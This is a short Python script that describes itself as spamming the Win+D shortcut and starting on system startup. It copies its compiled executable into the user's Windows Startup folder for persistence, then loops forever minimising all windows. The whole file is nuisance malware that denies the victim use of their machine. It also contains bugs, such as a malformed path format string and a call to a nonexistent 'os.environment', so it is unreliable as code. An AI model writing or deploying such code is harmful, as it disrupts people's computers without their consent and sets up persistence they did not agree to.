#DESCIPRTION: spams win + D and starts on system startup

import pyautogui, os, getpass, os.path, time
from os import path

filename = "NAME OF COMPILED EXE"
uname = getpass.getuser()
fpath = r'C:\Users\%s%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % uname

def minimize():
    while True:
        pyautogui.hotkey('winleft', 'd')

if path.exists(fpath+f"\{filename}.exe"):
    minimize()
else:
    aup = os.environment.get("ALLUSERSPROFILE")
    up = os.environment.get("USERPROFILE")
    if aup and up:
        os.rename(f"{filename}.exe", f"{fpath}/{filename}.exe")
        time.sleep(2)
        minimize()